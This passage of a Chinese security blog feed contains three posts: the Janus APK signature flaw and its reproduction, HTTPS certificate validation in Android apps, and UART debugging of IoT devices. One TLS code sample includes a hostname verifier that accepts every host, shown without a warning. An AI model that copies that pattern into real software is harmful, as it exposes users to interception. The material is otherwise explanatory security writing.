<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Janus漏洞主要是向APK里面添加额外的DEX文件。一方面，APK文件是zip文件，可以包含初始时的任意字节，在它的zip条目（实际情况下更多是在zip条目里面）。但是JAR签名方案只考虑了zip入口。当计算或者校验apk的签名的时候，它忽略了其他字节。另一方面，在字符串、类、方法定义等常规部分之后，一个DEX文件可以包含任意的字节。综上所述，一个文件可以同时包含一个APK文件和一个DEX文件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image016.jpg" alt="img"><br>另一个关键点是Dalvik / ART虚拟机方面。android运行加载APK文件，提取它的DEX文件，然后运行它的代码。在实践中，虚拟机可以加载和执行APK文件。当它得到APK文件时，它仍然会查看header的magic字节来判断它是什么类型的文件，如果找到一个DEX类型的，就会将文件载入为DEX文件，否则就会将文件加载为一个APK文件，其中包括一个带有DEX的zip文件。因此，既可以读取DEX文件又可以读取APK文件。<br>所以攻击者可以利用着这种二元性，在不影响其签名的情况下将一个恶意DEX文件预先添加到APK文件里面，然后，android运行时接受APK文件作为一个合法的早期版本的应用程序的有效更新，但是Dalvik虚拟机从注入的DEX文件中加载代码，从而实现攻击。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image018.jpg" alt="img"><br>原来的apk主要代码<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image019.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image021.jpg" alt="img"><br>修改了dex文件，将Log.i(“janus”,”点击事件”);修改为Toast.makeText(getApplicationContext(),”I steal your car.”,Toast.LENGTH_LONG).show();<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image023.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image024.jpg" alt="img"><br>安装合并好的1.apk<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image026.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image027.jpg" alt="img"><br>测试<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image029.jpg" alt="img"><br>攻击完成</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>该漏洞仅影响基于 JAR 签名的方案（v1 方案）。不影响自Android 7.0 以来引入的 APK 签名方案 v2（v2 方案）。</p>
<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>可被添加恶意dex文件可以进行一些敏感性的操作，例如窃取用户数据、监控手机等高危操作。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://source.android.com/security/apksigning/v2#verification" rel="external nofollow noopener noreferrer" target="_blank">https://source.android.com/security/apksigning/v2#verification</a><br><a href="https://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures" rel="external nofollow noopener noreferrer" target="_blank">https://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;Android系统要求每一个Android应用程序必须要经过数字签名才能够安装到系统中，也就是说如果一个Android应用程序没有经过数字签
    
    </summary>
    
      <category term="移动安全" scheme="http://www.future-sec.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="移动安全" scheme="http://www.future-sec.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
      <category term="app签名" scheme="http://www.future-sec.com/tags/app%E7%AD%BE%E5%90%8D/"/>
    
  </entry>
  
  <entry>
    <title>你在互联网上的数据还在裸奔吗？</title>
    <link href="http://www.future-sec.com/android-ssl-security.html"/>
    <id>http://www.future-sec.com/android-ssl-security.html</id>
    <published>2017-12-04T16:00:00.000Z</published>
    <updated>2018-06-29T09:01:12.637Z</updated>
    
    <content type="html"><![CDATA[<p>这是今年三月份有关移动市场的统计数据,移动app的数量已经突破10亿。移动安全也成为了一个全民关注的问题。从最初的app只针对功能实现，爆出来了一系列的高危漏洞之后，应运而生了包括移动app检测、app加固保护等工作来保护开发者以及使用者权益。同时，http的明文数据传输问题也得到了有效解决。我们本篇文章的讨论内容还是从数据传输过程中所引发的一系列安全问题。 <img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/20170418102254459.jpg" alt="img"></p>
<h2 id="数据裸奔时代"><a href="#数据裸奔时代" class="headerlink" title="数据裸奔时代"></a>数据裸奔时代</h2><h3 id="使用http协议的数据传输方式"><a href="#使用http协议的数据传输方式" class="headerlink" title="使用http协议的数据传输方式"></a>使用http协议的数据传输方式</h3><p>HyperText Transfer Protocol，超文本传输协议，是互联网上使用最广泛的一种协议，所有WWW文件必须遵循的标准。HTTP协议传输的数据都是未加密的，也就是明文的，因此使用HTTP协议传输隐私信息非常不安全。<br>使用TCP端口为：80<br>最初的移动app开发过程中，使用的大部分http协议来进行客户端跟服务端的通信。这个过程中传输的信息都是明文，继而引发了一系列的信息泄露等漏洞.<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/httpa.png" alt="img"><br>wireshark简单捕获就能看到明文隐私数据<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/httpb.png" alt="img"><br>当然上述极为不安全的数据传输，在2015年被大量爆出来之后，立即引起了app的开发人员以及使用着的重视。后续的数据传输使用了相对安全的基于SSL/TLS加密的安全的超文本传输协议https。</p>
<h2 id="你所使用的加密数据传输真的有保证你的数据不被窃取吗？"><a href="#你所使用的加密数据传输真的有保证你的数据不被窃取吗？" class="headerlink" title="你所使用的加密数据传输真的有保证你的数据不被窃取吗？"></a>你所使用的加密数据传输真的有保证你的数据不被窃取吗？</h2><h3 id="https加密传输"><a href="#https加密传输" class="headerlink" title="https加密传输"></a>https加密传输</h3><p>Hyper Text Transfer Protocol over Secure Socket Layer，安全的超文本传输协议，网景公式设计了SSL(Secure Sockets Layer)协议用于对Http协议传输的数据进行加密，保证会话过程中的安全性。<br>使用TCP端口默认为443<br>SSL协议即用到了对称加密也用到了非对称加密(公钥加密)，在建立传输链路时，SSL首先对对称加密的密钥使用公钥进行非对称加密，链路建立好之后，SSL对传输内容使用对称加密。<br>对称加密</p>
<p>速度高，可加密内容较大，用来加密会话过程中的消息<br>公钥加密 加密速度较慢，但能提供更好的身份认证技术，用来加密对称加密的密钥</p>
<h3 id="HTTPs单向认证机制"><a href="#HTTPs单向认证机制" class="headerlink" title="HTTPs单向认证机制"></a>HTTPs单向认证机制</h3><p>单向认证主要是客户端保存有服务端的公钥证书，自己本身是没有私钥证书的。<br>1、给服务器生成密钥方式：<br>keytool -genkeypair -alias skxy -keyalg RSA -validity 3650 -keypass 123456 -storepass 123456 -keystore skxy.keystore<br>2、给Tomcat服务器配置Https<br>tomcat/config/server.xml修改connector配置<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;Connector port=<span class="string">"8443"</span> protocol=<span class="string">"org.apache.coyote.http11.Http11Protocol"</span></div><div class="line">        maxThreads=<span class="string">"150"</span> SSLEnabled=<span class="string">"true"</span> scheme=<span class="string">"https"</span> secure=<span class="string">"true"</span></div><div class="line">        clientAuth=<span class="string">"false"</span> sslProtocol=<span class="string">"TLS"</span></div><div class="line">        keystoreFile=<span class="string">"conf/skxy.keystore"</span></div><div class="line">        keystorePass=<span class="string">"123456"</span>/&gt;</div></pre></td></tr></table></figure></p>
<p>3、导出证书<br>keytool -export -alias skxy -file skxy.cer -keystore skxy.keystore -storepass 123456<br>4、将证书放在android客户端，能够读取的地方比如assert目录 5.代码中执行网络请求，获取证书，读取https网站的数据。<br>客户端单向认证代码实现部分<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">String path = <span class="string">"https://10.0.3.2:8443/Test/Hlloer"</span>;</div><div class="line">?</div><div class="line">   <span class="keyword">try</span> &#123;  </div><div class="line">       <span class="comment">//获取证书  </span></div><div class="line">       InputStream stream = getAssets().open(<span class="string">"skxy.cer"</span>);  </div><div class="line">       SSLContext tls = SSLContext.getInstance(<span class="string">"TLS"</span>);  </div><div class="line">       <span class="comment">//使用默认证书  </span></div><div class="line">       KeyStore keystore = KeyStore.getInstance(KeyStore.getDefaultType());  </div><div class="line">       <span class="comment">//去掉系统默认证书  </span></div><div class="line">       keystore.load(<span class="keyword">null</span>);  </div><div class="line">       Certificate certificate =            CertificateFactory.getInstance(<span class="string">"X.509"</span>).generateCertificate(stream);  </div><div class="line">       <span class="comment">//设置自己的证书  </span></div><div class="line">       keystore.setCertificateEntry(<span class="string">"skxy"</span>, certificate);  </div><div class="line">       <span class="comment">//通过信任管理器获取一个默认的算法  </span></div><div class="line">       String algorithm = TrustManagerFactory.getDefaultAlgorithm();  </div><div class="line">       <span class="comment">//算法工厂创建  </span></div><div class="line">       TrustManagerFactory instance = TrustManagerFactory.getInstance(algorithm);  </div><div class="line">       instance.init(keystore);  </div><div class="line">       tls.init(<span class="keyword">null</span>, instance.getTrustManagers(), <span class="keyword">null</span>);  </div><div class="line">       SSLSocketFactory socketFactory = tls.getSocketFactory();  </div><div class="line">       HttpsURLConnection.setDefaultSSLSocketFactory(socketFactory);  </div><div class="line">       URL url = <span class="keyword">new</span> URL(path);  </div><div class="line">       HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();  </div><div class="line">       <span class="comment">//设置ip授权认证：如果已经安装该证书，可以不设置，否则需要设置  </span></div><div class="line">       conn.setHostnameVerifier(<span class="keyword">new</span> HostnameVerifier() &#123;  </div><div class="line">           @Override  </div><div class="line">           <span class="keyword">public</span> boolean verify(String hostname, SSLSession session) &#123;  </div><div class="line">               <span class="keyword">return</span> <span class="keyword">true</span>;  </div><div class="line"></div><div class="line">           &#125;  </div><div class="line"></div><div class="line">       &#125;);  </div><div class="line">       InputStream inputStream = conn.getInputStream();  </div><div class="line">       String result = getString(inputStream);  </div><div class="line">       stream.close();</div></pre></td></tr></table></figure></p>
<h3 id="单向认证过程："><a href="#单向认证过程：" class="headerlink" title="单向认证过程："></a>单向认证过程：</h3><p>(1) 客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。<br>(2) 服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书<br>(3) 客户端使用服务端返回的信息验证服务器的合法性，包括：<br> 1.证书是否过期<br> 2.发型服务器证书的CA是否可靠<br> 3.返回的公钥是否能正确解开返回证书中的数字签名<br> 4.服务器证书上的域名是否和服务器的实际域名相匹配<br> 5.验证通过后，将继续进行通信，否则，终止通信<br>(4) 客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择<br>(5) 服务器端在客户端提供的加密方案中选择加密程度最高的加密方式。<br>(6) 服务器将选择好的加密方案通过明文方式返回给客户端<br>(7) 客户端接收到服务端返回的加密方式后，使用该加密方式生成产生随机码，用作通信过程中对称加密的密钥，使用服务端返回的公钥进行加密，将加密后的随机码发送至服务器<br>(8) 服务器收到客户端返回的加密信息后，使用自己的私钥进行解密，获取对称加密密钥。<br>在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。</p>
<h3 id="Https双向认证机制"><a href="#Https双向认证机制" class="headerlink" title="Https双向认证机制"></a>Https双向认证机制</h3><p>首先对于双向证书验证，也就是说，客户端有自己的密钥，并持有服务端的证书，服务端给客户端发送数据时，需要将服务端的证书发给客户端验证，验证通过才运行发送数据，同样，客户端请求服务器数据时，也需要将自己的证书发给服务端验证，通过才允许执行请求。<br>客户端双向认证代码实现部分<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MySSLSocketFactory</span> </span>&#123;</div><div class="line">?</div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY_STORE_TYPE_BKS = <span class="string">"bks"</span>;<span class="comment">//证书类型</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY_STORE_TYPE_P12 = <span class="string">"PKCS12"</span>;<span class="comment">//证书类型</span></div><div class="line">?</div><div class="line">?</div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY_STORE_PASSWORD = <span class="string">"****"</span>;<span class="comment">//证书密码（应该是客户端证书密码）</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY_STORE_TRUST_PASSWORD = <span class="string">"***"</span>;<span class="comment">//授信证书密码（应该是服务端证书密码）</span></div><div class="line">?</div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SSLSocketFactory getSocketFactory(Context context) &#123;</div><div class="line">?</div><div class="line">?</div><div class="line">        InputStream trust_input = context.getResources().openRawResource(R.raw.trust);<span class="comment">//服务器授信证书</span></div><div class="line">        InputStream client_input = context.getResources().openRawResource(R.raw.client);<span class="comment">//客户端证书</span></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">                    SSLContext sslContext = SSLContext.getInstance(<span class="string">"TLS"</span>); </div><div class="line">                    KeyStore trustStore = KeyStore.getInstance(KeyStore.getDefaultType());</div><div class="line">                    trustStore.load(trust_input, KEY_STORE_TRUST_PASSWORD.toCharArray()); </div><div class="line">                    KeyStore keyStore = KeyStore.getInstance(KEY_STORE_TYPE_P12);  </div><div class="line">                    keyStore.load(client_input, KEY_STORE_PASSWORD.toCharArray());</div><div class="line">                    TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());</div><div class="line">                    trustManagerFactory.init(trustStore);</div><div class="line">                    KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());</div><div class="line">                   keyManagerFactory.init(keyStore, KEY_STORE_PASSWORD.toCharArray());</div><div class="line">                   sslContext.init(keyManagerFactory.getKeyManagers(), trustManagerFactory.getTrustManagers(), <span class="keyword">new</span> SecureRandom());</div><div class="line">                   SSLSocketFactory factory = sslContext.getSocketFactory();</div><div class="line">                   <span class="keyword">return</span> factory;</div><div class="line">               &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> e) &#123;</div><div class="line">                           e.printStackTrace(); </div><div class="line">                          <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">               &#125; <span class="keyword">finally</span> &#123; </div><div class="line">                          <span class="keyword">try</span> &#123;</div><div class="line">                                trust_input.close(); </div><div class="line">                               client_input.close();</div><div class="line">                          &#125; <span class="keyword">catch</span> (IOException e) &#123; </div><div class="line">                               e.printStackTrace();  </div><div class="line">                         &#125; </div><div class="line">               &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="双向认证过程："><a href="#双向认证过程：" class="headerlink" title="双向认证过程："></a>双向认证过程：</h3><p>(1) 客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。<br>(2) 服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书<br> 客户端使用服务端返回的信息验证服务器的合法性，包括：<br> 1.证书是否过期<br> 2.发型服务器证书的CA是否可靠<br> 3.返回的公钥是否能正确解开返回证书中的数字签名<br> 4.服务器证书上的域名是否和服务器的实际域名相匹配<br>(3) 验证通过后，将继续进行通信，否则，终止通信<br>(4) 服务端要求客户端发送客户端的证书，客户端会将自己的证书发送至服务端<br>(5) 验证客户端的证书，通过验证后，会获得客户端的公钥<br>(6) 客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择<br>(7) 服务器端在客户端提供的加密方案中选择加密程度最高的加密方式<br>(8) 将加密方案通过使用之前获取到的公钥进行加密，返回给客户端<br>(9) 客户端收到服务端返回的加密方案密文后，使用自己的私钥进行解密，获取具体加密方式，而后，产生该加密方式的随机码，用作加密过程中的密钥，使用之前从服务端证书中获取到的公钥进行加密后，发送给服务端<br>(10) 服务端收到客户端发送的消息后，使用自己的私钥进行解密，获取对称加密的密钥，在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。</p>
<h2 id="我们身边的app中所使用的加密传输是怎样的呢？"><a href="#我们身边的app中所使用的加密传输是怎样的呢？" class="headerlink" title="我们身边的app中所使用的加密传输是怎样的呢？"></a>我们身边的app中所使用的加密传输是怎样的呢？</h2><p>某宝（金融类app）的数据加密分析（https单向认证） 为了更加清晰的了解https在实际项目中的应用，特意花了点时间分析了一个app的加密认证过程。app虽然加了部分混淆，但并没有加固，所以也不难分析。<br>（1）整个发送https post请求过程.ip以及域名都是固定的，证书也写死在app里。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/https_post.png" alt="img"><br>（2）https认证过程<br>判断代理服务器以及证书校验<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/https.png" alt="img"><br>证书校验过程<br>在获取证书的过程中，仅仅读取了证书的信息，并没有实现校验证书是否安全可靠的代码。这里就留下了安全隐患。使用第三方证书一样可以截获数据。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/setcer.png" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/getcer.png" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/iscer.png" alt="img"><br>数据解密过程<br>在数据解密过程也不够严谨，密钥和向量通过简单逆向分析就能获得。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/desDecode.png" alt="img"><br>解密key的获取方式：数据包名的md5<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/decode2.png" alt="img"><br>解密向量<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/decodeiv.png" alt="img"><br>通过这个简单分析，你还敢说你的数据是安全传输的吗？</p>
<h2 id="安全隐患"><a href="#安全隐患" class="headerlink" title="安全隐患"></a>安全隐患</h2><p>因为开发方便而信任所有证书<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/wrong.png" alt="img"><br>重写了校验机制，但并没有做任何检验SSL证书有效性。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/wrong2.png" alt="img"></p>
<h2 id="扩展-Java-Security安全体系知识延伸"><a href="#扩展-Java-Security安全体系知识延伸" class="headerlink" title="扩展 Java Security安全体系知识延伸"></a>扩展 Java Security安全体系知识延伸</h2><h3 id="Java-Security-背景知识"><a href="#Java-Security-背景知识" class="headerlink" title="Java Security 背景知识"></a>Java Security 背景知识</h3><p>Java Security其实是Java平台中一个比较独立的模块。除了软件实现上内容外，它实际上对应了一系列的规范。从Java2开始，Java Security包含主要三个重要的规范：</p>
<p>JavaCryptography Extension（简写为JCE），JCE所包含的内容有加解密，密钥交换，消息摘要（Message Digest，比如MD5等），密钥管理等。本文所涉及的大部分内容都属于JCE的范畴。<br>JavaSecure Socket Extension（简写为JSSE），JSSE所包含的内容就是Java层的SSL/TLS。简单点说，使用JSSE就可以创建SSL/TLS socket了。<br>JavaAuthentication and Authorization Service（简写为JAAS），JSSA和认证/授权有关。这部分内容在客户端接触得会比较少一点，所以本文不拟讨论它。<br>在上述三个子模块或规范中，JCE是JavaSecurity的大头，其他两个子模块JSSE和JAAS都依赖于它，比如SSL/TLS在工作过程中需要使用密钥对数据进行加解密，那么密钥的创建和使用就依靠JCE子模块了。 另外，既然和安全相关，那么对安全敏感的相关部门或政府肯定会有所干涉。Java是在美国被发明的，所以美国政府对于Java Security方面的出口（比如哪些模块，哪些功能能给其他国家使用）有相关的限制。例如，不允许出口的JCE（从软件实现上看，可能就是从Java官网上下载到的几个Jar包文件）支持一些高级的加解密功能（比如在密钥长度等方面有所限制）。</p>
<h3 id="JCE的介绍"><a href="#JCE的介绍" class="headerlink" title="JCE的介绍"></a>JCE的介绍</h3><p>JCE最初是作为JCA的扩展包开发的，旨在提供受美国出口控制条例管制的加密服务API和实现。JCE提供一个提供者实现和一组相关的API和包，以支持加密和解密，密钥的生成和协商以及消息验证算法，其中对加密和解密的支持包括对称加密、非对称加密、块加密和流加密。JCE还支持安全流和封装流对象。<br>JCE的架构模型如下图所示：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/jce.jpg" alt="img"></p>
<h2 id="issue"><a href="#issue" class="headerlink" title="issue"></a>issue</h2><p>1.不要忽略证书校验</p>
<p>2.保护好自己的密钥</p>
<p>3.尽量使用规范的https协议</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1.<a href="http://blog.csdn.net/xdd19910505/article/details/51926540" rel="external nofollow noopener noreferrer" target="_blank">http://blog.csdn.net/xdd19910505/article/details/51926540</a></p>
<p>2.<a href="https://www.cnblogs.com/xiekeli/p/5607107.html" rel="external nofollow noopener noreferrer" target="_blank">https://www.cnblogs.com/xiekeli/p/5607107.html</a></p>
<p>3.<a href="http://www.jcodecraeer.com/a/anzhuokaifa/androidkaifa/2014/0607/1621.html" rel="external nofollow noopener noreferrer" target="_blank">http://www.jcodecraeer.com/a/anzhuokaifa/androidkaifa/2014/0607/1621.html</a></p>
<p>4.<a href="https://www.waitalone.cn/bank-ssl-cap.html" rel="external nofollow noopener noreferrer" target="_blank">https://www.waitalone.cn/bank-ssl-cap.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是今年三月份有关移动市场的统计数据,移动app的数量已经突破10亿。移动安全也成为了一个全民关注的问题。从最初的app只针对功能实现，爆出来了一系列的高危漏洞之后，应运而生了包括移动app检测、app加固保护等工作来保护开发者以及使用者权益。同时，http的明文数据传输问
    
    </summary>
    
      <category term="移动安全" scheme="http://www.future-sec.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ssl" scheme="http://www.future-sec.com/tags/ssl/"/>
    
      <category term="https" scheme="http://www.future-sec.com/tags/https/"/>
    
  </entry>
  
  <entry>
    <title>物联网硬件安全分析基础-串口调试</title>
    <link href="http://www.future-sec.com/iot-security-hardware-debuging.html"/>
    <id>http://www.future-sec.com/iot-security-hardware-debuging.html</id>
    <published>2017-12-04T16:00:00.000Z</published>
    <updated>2018-06-29T10:45:13.094Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上节介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态调试。<br>通用异步收发传输器（Universal Asynchronous Receiver/Transmitter)，通常称作UART，是一种异步收发传输器，是电脑硬件的一部分。它将要传输的资料在串行通信与并行通信之间加以转换。作为把并行输入信号转成串行输出信号的芯片，UART通常被集成于其他通讯接口的连结上。<br>对于物联网硬件的串口调试，多数情况下指的就是通过UART串口进行数据通讯， 但是我们经常搞不清楚它和COM口的区别,  以及RS232, TTL等关系,             实际上UART、COM指的物理接口形式(硬件), 而TTL、RS-232是指的电平标准(电信号).<br>UART有4个pin（VCC, GND, RX, TX）, 用的TTL电平， 低电平为0(0V)、高电平为1（3.3V或以上），Uart串口的RXD、TXD等一般直接与处理器芯片的引脚相连，而RS232串口的RXD、TXD等一般需要经过电平转换(通常由Max232等芯片进行电平转换)才能接到处理器芯片的引脚上，否则这么高的电压很可能会把芯片烧坏。<br> 在调试的时候, 多数情况下我们只引出rx、tx、gnd即可，但是UART的数据要传到电脑上分析就要匹配电脑的接口，通常我们电脑使用接口有COM口和USB口（最终在电脑上是一个虚拟的COM口），但是要想连上这两种接口都要需要进行硬件接口转换和电平转换。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image32.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image33.jpg" alt=""></p>
<h2 id="UART串口调试"><a href="#UART串口调试" class="headerlink" title="UART串口调试"></a>UART串口调试</h2><p>UART调试第一步需要先找到对应的四个PIN，在通电情况下，VCC口可以不要接，判断 GND, RX, TX三个引脚是调试的关键，找四个引脚可以先看PCB上的印字。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image65.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image66.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image67.jpg" alt=""></p>
<p>但多数厂商在量产前会去掉用于调试的串口印字，如果找不到对应引脚的印字，就需要先分析PCB的结构，一般PCB上有3、4 、5个并排或相距不远的焊点或通孔，就有可能是UART调试串口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image68.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image69.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image70.jpg" alt=""></p>
<p>但PCB上可能存在多个这样的焊点或通孔，从多个口中找出真正的调试串口，就需要借助到万用表。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image101.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image102.jpg" alt=""></p>
<p>万用表找串口首先需要找到GND口，就是接地口，在疑似串口的焊点处，通过测量电势差，可以判断出GND口，通过连接焊点和输入负极，如果电势为0，就可能是GND口，如果电势为最大值，例如3.6V、5V等，就可能是VCC口。然后通过UART转换器对应的4个口，引出导线，并设置好串口输出环境后，就可以依次尝试。也可以通过短接其中的两口，如果机器重启，就可以判断这两口为VCC和GND。<br>需要注意的是，在TTL电平模式下，UATR转换接口上的RX、TX口与上位设备，也就是PCB上的UART口的RX和TX是需要反接的。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image71.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image72.jpg" alt=""></p>
<h3 id="案例一：调试某智能摄像头"><a href="#案例一：调试某智能摄像头" class="headerlink" title="案例一：调试某智能摄像头"></a>案例一：调试某智能摄像头</h3><p>通过万用表测量电势差之后，在靠近CPU的地方有三个通孔，有可能是UART串口，用导线连接之后，设置波特率为115200。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image73.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image35.jpg" alt=""></p>
<p>用SecureCRT连接串口，给机器通上电之后，串口立马输出了启动信息，并可以执行命令，说明串口正确，如果遇到无法输入的情况，首先检查接线是否松动，然后在SecureCRT中的， Session Options -&gt; Connection -&gt; Serial -&gt; Flow Control，将原先选中的 RTS/CTS取消掉，这是因为如果选中了RTS/CTS ，则硬件上要有对应接口，软件上实现对应协议，才能实现此流控制。如果串口输出为乱码，则需要切换波特率，直至输出正常。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image74.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image75.jpg" alt=""></p>
<h3 id="案例二：调试某路由器"><a href="#案例二：调试某路由器" class="headerlink" title="案例二：调试某路由器"></a>案例二：调试某路由器</h3><p>在靠近cpu的地方有四个通孔，测量电势差后，利用导线探针，确定了三个PIN，连接转换器。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image76.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image77.jpg" alt=""></p>
